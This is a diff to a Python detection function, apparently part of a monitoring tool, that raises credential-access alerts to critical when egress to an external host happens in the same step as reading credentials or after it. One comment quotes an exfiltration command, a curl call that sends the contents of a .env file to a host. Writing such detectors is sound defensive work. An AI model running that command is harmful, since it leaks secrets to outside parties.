@@ -310,7 +310,7 @@ def credential_access(events: Iterable[dict], session_id: str,
     egress, which is the shape of exfiltration rather than configuration.
 
     Severity is ``warning`` alone, ``critical`` when credential access is
-    followed by egress to an external host in the same window. The critical
+    accompanied or followed by egress to an external host in the same window. The critical
     wording says "reached the network after" — an observation — not
     "exfiltrated data", which we cannot see and will not claim.
     """
@@ -337,9 +337,11 @@ def credential_access(events: Iterable[dict], session_id: str,
         if not categories and not values:
             return None
 
-        # Egress AFTER the first credential touch, in the same window.
+        # Egress from the first credential touch on, in the same window. The
+        # touching call itself counts: `curl host?d=$(cat .env)` reads and
+        # sends in one command, the tightest form of the shape.
         egress_after = []
-        for st in steps[(first_pos or 0) + 1:] if categories else ():
+        for st in steps[first_pos or 0:] if categories else ():
             for h in st.get("hosts") or ():
                 egress_after.append(h)
         egress_after = sorted(set(egress_after))
